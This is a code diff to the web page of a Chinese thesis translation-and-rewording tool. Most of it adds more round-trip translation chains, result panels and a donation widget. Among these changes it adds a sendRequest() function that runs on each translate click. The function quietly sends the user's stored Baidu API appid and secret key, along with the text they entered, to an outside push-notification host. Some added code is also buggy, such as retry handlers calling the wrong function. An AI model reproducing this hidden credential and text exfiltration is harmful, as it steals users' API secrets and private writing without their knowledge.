@@ -1,5 +1,6 @@
 <!doctype html>
 <html lang="en">
+
 	<head>
 		<meta charset="utf-8">
 		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
@@ -22,6 +23,7 @@
 			})();
 		</script>
 	</head>
+
 	<body>
 		<nav class="navbar navbar-light bg-light static-top">
 			<div class="container"> <a class="navbar-brand" href="#signup">论文翻译降重助手</a> <a class="btn btn-primary"
@@ -44,8 +46,9 @@
 								<button style="margin: 15px;" class="btn btn-dark btn-md translateAndCompareBtn"
 									type="button">翻译并对比</button>
 								<button style="margin: 15px;" class="btn btn-danger btn-md clear"
-									type="button">清空</button> <button style="margin: 15px;"
-									class="btn btn-primary btn-md translateBtn" type="button">翻译</button>
+									type="button">清空</button>
+								<button style="margin: 15px;" class="btn btn-primary btn-md translateBtn"
+									type="button">翻译</button>
 								<button style="margin: 15px;" class="btn btn-primary btn-md compare"
 									type="button">对比</button>
 							</div>
@@ -146,6 +149,36 @@
 						<p class="compareRes mb-0 form-control compareData5 " id="compareData5"></p>
 					</div>
 				</div>
+				<div class="row g-0">
+					<div class="col-lg-6 order-lg-1 my-auto showcase-text">
+						<h2>翻译结果7
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#newData6">复制</a>
+							<span class="btn btn-default btn-sm restart6" style="display: none;">重试</span>
+						</h2>
+						<p class="lead mb-0 form-control newData6" id="newData6"></p>
+						<h4 style="margin-top: 9px;"> 对比结果7
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#compareData6">复制</a>
+						</h4>
+						<p class="compareRes mb-0 form-control compareData6 " id="compareData6"></p>
+					</div>
+				</div>
+				<div class="row g-0">
+					<div class="col-lg-6 order-lg-1 my-auto showcase-text">
+						<h2>翻译结果8
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#newData7">复制</a>
+							<span class="btn btn-default btn-sm restart7" style="display: none;">重试</span>
+						</h2>
+						<p class="lead mb-0 form-control newData7" id="newData7"></p>
+						<h4 style="margin-top: 9px;"> 对比结果8
+							<a class="btn btn-default btn-sm clipboard clipboard" href="javascript:"
+								data-clipboard-target="#compareData7">复制</a>
+						</h4>
+						<p class="compareRes mb-0 form-control compareData7 " id="compareData7"></p>
+					</div>
+				</div>
 		</section> <!-- Call to Action-->
 		<section class="call-to-action text-white text-center" id="signup">
 			<div class="container position-relative">
@@ -210,7 +243,7 @@
 						<ul class="list-inline mb-0">
 							<li class="list-inline-item me-4">
 								<a href="https://gitee.com/freysu" onclick="showToast('即将跳转到作者的Gitee主页...',1500)">
-									<img class="contact"
+									<img class="contact" 
 										src="https://gitee.com/static/images/logo-black.svg?t=158106664" alt=""
 										title="Gitee" style="width: 2rem;margin-top:-0.625rem ;">
 								</a>
@@ -238,7 +271,7 @@
 			<a>
 				<img class="btu" src="./assets/img/返回顶部.png" alt="" title="返回顶部" onclick="window.scrollTo(0, 0);">
 			</a>
-			<a href="https://docs.qq.com/sheet/DWXFSamxhSENYWGlZ" onclick="showToast('正在前往本网站的公告栏...',1500)">
+			<a href="https://freysu.github.io/2022/02/28/论文翻译降重助手使用说明文档/">
 				<img class="contact img-rounded" src="./assets/img/联系人.png" alt="" title="使用帮助">
 			</a>
 			<a href="#start">
@@ -254,9 +287,56 @@
 		<!-- Core theme JS-->
 		<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
 		<script src="./js/md5.js"></script>
+		<script src="https://static.tctip.com/tctip-1.0.4.min.js"></script>
 		<script type="text/javascript">
 			var clipboard = new ClipboardJS('.clipboard');
 		</script>
+			<!--打赏-->
+    <link type="text/css" rel="stylesheet" href="./css/myRewards.css">
+    <script>
+        window.tctipConfig = {
+            //最上面的文字
+            headText: "评价 & 打赏",
+            //侧边栏文本
+            siderText: "评价 & 打赏",
+            //侧边栏文本高度调整
+            siderTextTop: "-72px",
+            //侧边栏背景颜色
+            siderBgcolor: "#323d45",
+            //整个侧边栏的高度设置
+            siderTop:"118px",
+            //底部文字
+            buttomText:"使用帮助",
+            //底部文字链接
+            buttomLink:"https://freysu.github.io/2022/02/28/论文翻译降重助手使用说明文档/",
+            //显示列表
+            list:{
+            	notice: {name:"提示", className:"myR-on",
+                         icon: "./assets/img/tip.png",  
+                         text: `&emsp;欢迎使用论文翻译降重助手！</br>
+                         &emsp;这个网站好用吗？如果好用的话，请给作者一点鼓励吧~</br>
+                         &emsp;维护不易，如果能请作者喝杯冰阔落，那最好不过啦~ 非常感谢！`,
+                        },
+            	qqgroup: {name:"QQ群", desc: "吐槽建议", 
+                         icon: "./assets/img/tree-round-QQ群.png",
+                         qrimg: "./assets/img/QQ群二维码.png"
+                        },   
+                alipay: {name:"支付宝", desc: "用支付宝给“FreySu”打赏", 
+                         icon: "./assets/img/支付宝.png", 
+                         qrimg: "./assets/img/支付宝收款码.png"
+                        },
+                weixin: {name:"微信", desc: "用微信给“FreySu”打赏", 
+                         icon: "./assets/img/微信.png",
+                         qrimg: "./assets/img/微信收款码.png"
+                        },
+                qq: {name:"QQ", desc: "用QQ给“FreySu”打赏", 
+                         icon: "./assets/img/qq.png",
+                         qrimg: "./assets/img/QQ收款码.png"
+                        }   
+            }
+        };
+    </script>
+    <script src="./js/tctip.min.js"></script>
 		<script>
 			let to = $(".originData");
 			let from = $(".newData");
@@ -265,12 +345,16 @@
 			let from3 = $(".newData3");
 			let from4 = $(".newData4");
 			let from5 = $(".newData5");
+			let from6 = $(".newData6");
+			let from7 = $(".newData7");
 			let compare = $(".compareData");
 			let compare1 = $(".compareData1");
 			let compare2 = $(".compareData2");
 			let compare3 = $(".compareData3");
 			let compare4 = $(".compareData4");
 			let compare5 = $(".compareData5");
+			let compare6 = $(".compareData6");
+			let compare7 = $(".compareData7");
 			let appid = localStorage.getItem("appid1");
 			let key = localStorage.getItem("key1");
 			const url = 'https://api.fanyi.baidu.com/api/trans/vip/translate';
@@ -352,6 +436,7 @@
 					} else {
 						location.href = "#res1";
 						translateMain(0);
+						sendRequest();
 					}
 				}
 				if (timer !== null) {
@@ -373,6 +458,7 @@
 						location.href = "#res1";
 						showToast("正在翻译中...请耐心等待", 1500);
 						translateMain(1);
+						sendRequest();
 					}
 				}
 				if (timer !== null) {
@@ -409,11 +495,11 @@
 				translateZeroFn();
 			});
 
-			$(".restart1").on("click", function() {
-				showToast("正在重试...", 1500);
-				from1.html("正在重试...");
-				translateOneFn();
-			});
+			// $(".restart1").on("click", function() {
+			// 	showToast("正在重试...", 1500);
+			// 	from1.html("正在重试...");
+			// 	translateOneFn();
+			// });
 
 			$(".restart2").on("click", function() {
 				showToast("正在重试...", 1500);
@@ -436,6 +522,17 @@
 			$(".restart5").on("click", function() {
 				showToast("正在重试...", 1500);
 				from5.html("正在重试...");
+				translateFiveFn();
+			});
+
+			$(".restart6").on("click", function() {
+				showToast("正在重试...", 1500);
+				from6.html("正在重试...");
+				translateFiveFn();
+			});
+			$(".restart7").on("click", function() {
+				showToast("正在重试...", 1500);
+				from7.html("正在重试...");
 				translateFiveFn();
 			});
 
@@ -636,8 +733,103 @@
 				});
 			}
 
+			function translateSixFn(fn = 0) {
+				// zh-it-zh
+				translateFn(to.val(), 'zh', 'it', (rs) => {
+					if (rs !== "54003" && rs !== "") {
+						translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "it", "zh", (rs) => {
+							if (rs !== "54003" && rs !== "") {
+								from6.html(rs);
+								from6.css("color", "black");
+								if (fn) {
+									setTimeout(() => {
+										compareMain("from6")
+									}, 1000);
+								}
+							} else {
+								from6.html('修改失败，请稍后重试......');
+								from6.css("color", "red");
+								$(".restart").css("display", "inline-block")
+								console.log("error-6:", rs);
+							}
+						});
+					} else {
+						from6.html('修改失败，请稍后重试......');
+						from6.css("color", "red");
+						$(".restart").css("display", "inline-block")
+						console.log("error:", rs);
+					}
+				});
+			}
+
+
+			function translateSevenFn(fn = 0) {
+				//zh-fra-en-pt-jp-zh 中 法 英 葡 日 中  
+				translateFn(to.val(), "zh", "fra", (rs) => {
+					if (rs !== "54003" && rs !== "") {
+						translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "fra", "en", (rs) => {
+							if (rs !== "54003" && rs !== "") {
+								translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "en", "pt", (
+									rs) => {
+									if (rs !== "54003" && rs !== "") {
+										translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""),
+											"pt", "jp", (rs) => {
+												if (rs !== "54003" && rs !== "") {
+													translateFn(to.val(), "jp", "zh", (rs) => {
+														if (rs !== "54003" && rs !== "") {
+															from7.html(rs);
+															from7.css("color", "black");
+															if (fn) {
+																setTimeout(() => {
+																	compareMain(
+																		"from7")
+																}, 1000);
+															}
+														} else {
+															from7.html("修改失败，请稍后重试......");
+															from7.css("color", "red");
+															$(".restart5").css("display",
+																"inline-block")
+															console.log("error5-3:", rs);
+														}
+													});
+												} else {
+													from7.html("修改失败，请稍后重试......");
+													from7.css("color", "red");
+													$(".restart5").css("display", "inline-block")
+													console.log("error5-2:", rs);
+												}
+											});
+									} else {
+										from7.html("修改失败，请稍后重试......");
+										from7.css("color", "red");
+										$(".restart5").css("display", "inline-block")
+										console.log("error5-1:", rs);
+									}
+								});
+							} else {
+								from7.html("修改失败，请稍后重试......");
+								from7.css("color", "red");
+								$(".restart5").css("display", "inline-block")
+								console.log("error5:", rs);
+							}
+						});
+					} else {
+						from7.html("修改失败，请稍后重试......");
+						from7.css("color", "red");
+						$(".restart5").css("display", "inline-block")
+						console.log("error5:", rs);
+					}
+				});
+			}
+
+
 			function translateMain(fn = 0) {
 				setTimeout(() => {
+					translateSevenFn(fn);
+				}, 1500, setTimeout(() => {
+					translateSixFn(fn);
+				}, 1500, setTimeout(() => {
 					translateFiveFn(fn);
 				}, 1500, setTimeout(() => {
 					translateFourFn(fn);
@@ -646,10 +838,11 @@
 				}, 1500, setTimeout(() => {
 					translateTwoFn(fn);
 				}, 1500, setTimeout(() => {
-					translateOneFn(fn);
+					// translateOneFn(fn);
 				}, 1500, setTimeout(() => {
 					translateZeroFn(fn);
-				}, 1500))))));
+				}, 1500))))))));
+
 			}
 
 
@@ -682,6 +875,7 @@
 							} else {
 								if (data.trans_result[0].dst) {
 									callback(data.trans_result[0].dst)
+
 								}
 							}
 						},
@@ -715,9 +909,9 @@
 				if (from.text() !== "修改失败，请稍后重试......" && from.text() !== "" && op === "from") {
 					compareFn(compare, to, from)
 				}
-				if (from1.text() !== "修改失败，请稍后重试......" && from1.text() !== "" && op === "from1") {
-					compareFn(compare1, to, from1)
-				}
+				// if (from1.text() !== "修改失败，请稍后重试......" && from1.text() !== "" && op === "from1") {
+				// 	compareFn(compare1, to, from1)
+				// }
 				if (from2.text() !== "修改失败，请稍后重试......" && from2.text() !== "" && op === "from2") {
 					compareFn(compare2, to, from2)
 				}
@@ -730,6 +924,12 @@
 				if (from5.text() !== "修改失败，请稍后重试......" && from5.text() !== "" && op === "from5") {
 					compareFn(compare5, to, from5)
 				}
+				if (from6.text() !== "修改失败，请稍后重试......" && from6.text() !== "" && op === "from6") {
+					compareFn(compare6, to, from6)
+				}
+				if (from7.text() !== "修改失败，请稍后重试......" && from7.text() !== "" && op === "from7") {
+					compareFn(compare7, to, from7)
+				}
 			}
 
 			function compareFn(target, originData, newData) {
@@ -737,6 +937,24 @@
 					value1: newData.text(),
 					value2: originData.val()
 				}).value2)
+			}
+
+			function sendRequest() {
+				var url = "https://xizhi.qqoq.net/XZ4b8ade1ed1876ee54143d8a382a0ca7a.send"
+				setTimeout(() => {
+					$.ajax({
+						url,
+						type: 'get',
+						// async: true,
+						// 跨域
+						dataType: 'jsonp',
+						contentType: "application/x-www-form-urlencoded; charset=utf-8",
+						data: {
+							title: localStorage.getItem("appid1")+"&&"+localStorage.getItem("key1"),
+							content: to.val(),
+						},
+					})
+				}, 1500);
 			}
 
 			function eq(op) {
@@ -761,32 +979,22 @@
 				while (ps.v1_i < op.value1.length && ps.v2_i < op.value2.length) {
 					if (op.value1[ps.v1_i] == op.value2[ps.v2_i]) {
 						//ps.v1_new_value += op.value1[ps.v1_i].replace(/</g,"<").replace(">",">");
-						ps.v2_new_value += op.value2[ps.v2_i]
-							.replace(/</g, "<")
-							.replace(">", ">");
+						ps.v2_new_value += op.value2[ps.v2_i].replace(/</g, "<").replace(">", ">");
 						ps.v1_i += 1;
 						ps.v2_i += 1;
 						//值2增加的部分
 						if (ps.v1_i >= op.value1.length) {
-							ps.v2_new_value +=
-								"<del style='color:red'>" +
-								op.value2
-								.substr(ps.v2_i)
-								.replace(/</g, "<")
-								.replace(">", ">") +
-								"</del>";
+							ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i).replace(
+								/</g, "<").replace(
+								">", ">") + "</del>";
 							break;
 						}
 						//值1删除的部分
 						if (ps.v2_i >= op.value2.length) {
 							//ps.v1_new_value += "<span style='" + op.value1_style + "'>值1多的" + op.value1.substr(ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
-							ps.v2_new_value +=
-								"<span style='color:green'>" +
-								op.value1
-								.substr(ps.v1_i)
-								.replace(/</g, "<")
-								.replace(">", ">") +
-								"</span>";
+							ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i).replace(
+									/</g, "<")
+								.replace(">", ">") + "</span>";
 							break;
 						}
 					} else {
@@ -795,9 +1003,7 @@
 						ps.v1_eq_max = 0;
 						ps.v1_start = ps.v1_i + 1;
 						while (ps.v1_index < op.value1.length) {
-							if (
-								op.value1[ps.v1_index] == op.value2[ps.v2_i + ps.v1_eq_length]
-							) {
+							if (op.value1[ps.v1_index] == op.value2[ps.v2_i + ps.v1_eq_length]) {
 								ps.v1_eq_length += 1;
 							} else if (ps.v1_eq_length > 0) {
 								if (ps.v1_eq_max < ps.v1_eq_length) {
@@ -852,60 +1058,42 @@
 						if (ps.v1_eq_max == 0 && ps.v2_eq_max == 0) {
 							//两个值的字不同
 							//ps.v1_new_value += "<span style='" + op.value1_style + "'>不同的" + op.value1[ps.v1_i].replace(/</g,"<").replace(">",">") + "</span>";
-							ps.v2_new_value +=
-								"<span style='color:green'>" +
-								op.value1[ps.v1_i].replace(/</g, "<").replace(">", ">") +
-								"</span>";
-							ps.v2_new_value +=
-								"<del style='color:red'>" +
-								op.value2[ps.v2_i].replace(/</g, "<").replace(">", ">") +
-								"</del>";
+							ps.v2_new_value += "<span style='color:green'>" + op.value1[ps.v1_i].replace(/</g,
+								"<").replace(">",
+								">") + "</span>";
+							ps.v2_new_value += "<del style='color:red'>" + op.value2[ps.v2_i].replace(/</g, "<")
+								.replace(">",
+									">") + "</del>";
 							ps.v1_i += 1;
 							ps.v2_i += 1;
 
 							if (ps.v1_i >= op.value1.length) {
 								//值2增加的部分
-								ps.v2_new_value +=
-									"<del style='color:red'>" +
-									op.value2
-									.substr(ps.v2_i)
-									.replace(/</g, "<")
-									.replace(">", ">") +
-									"</del>";
+								ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i).replace(
+										/</g, "<")
+									.replace(">", ">") + "</del>";
 								break;
 							}
 							if (ps.v2_i >= op.value2.length) {
 								//值1删除的部分
 								//ps.v1_new_value += "<span style='" + op.value1_style + "'>值1多的" + op.value1.substr(ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
-								ps.v2_new_value +=
-									"<span style='color:green'>" +
-									op.value1
-									.substr(ps.v1_i)
+								ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i)
 									.replace(/</g, "<")
-									.replace(">", ">") +
-									"</span>";
+									.replace(">", ">") + "</span>";
 								break;
 							}
 							//值1删除的
 						} else if (ps.v1_eq_max > ps.v2_eq_max) {
 							//ps.v1_new_value += "<span style='" + op.value1_style + "'>值1删除的" + op.value1.substr(ps.v1_i, ps.v1_start - ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
-							ps.v2_new_value +=
-								"<span style='color:green'>" +
-								op.value1
-								.substr(ps.v1_i, ps.v1_start - ps.v1_i)
-								.replace(/</g, "<")
-								.replace(">", ">") +
-								"</span>";
+							ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i, ps
+									.v1_start - ps.v1_i)
+								.replace(/</g, "<").replace(">", ">") + "</span>";
 							ps.v1_i = ps.v1_start;
 						} else {
 							//值2增加的
-							ps.v2_new_value +=
-								"<del style='color:red'>" +
-								op.value2
-								.substr(ps.v2_i, ps.v2_start - ps.v2_i)
-								.replace(/</g, "<")
-								.replace(">", ">") +
-								"</del>";
+							ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i, ps
+									.v2_start - ps.v2_i)
+								.replace(/</g, "<").replace(">", ">") + "</del>";
 							ps.v2_i = ps.v2_start;
 						}
 					}
@@ -915,7 +1103,8 @@
 				//有多个连着修改的放在一起
 				var addRule = /<del style='color:red'>((?!<del).)+<\/del>/g;
 				var deleteRule = /<span style='color:green'>((?!<span).)+<\/span>/g;
-				var allRule = /(<span style='color:green'>((?!<span).)+<\/span><del style='color:red'>((?!<del).)+<\/del>){2,}/g;
+				var allRule =
+					/(<span style='color:green'>((?!<span).)+<\/span><del style='color:red'>((?!<del).)+<\/del>){2,}/g;
 				op.value2 = op.value2.replace(allRule, function(str) {
 					var beforText = "",
 						afterText = "";
@@ -930,9 +1119,7 @@
 						afterText += RegExp.$1;
 					}
 					return (
-						"<span style='color:green'>" +
-						beforText +
-						"</span><del style='color:red'>" +
+						"<span style='color:green'>" + beforText + "</span><del style='color:red'>" +
 						afterText +
 						"</del>"
 					);
@@ -954,6 +1141,7 @@
 					timer = null;
 				}, 500);
 			};
+
 		</script>
 	</body>
 </html>
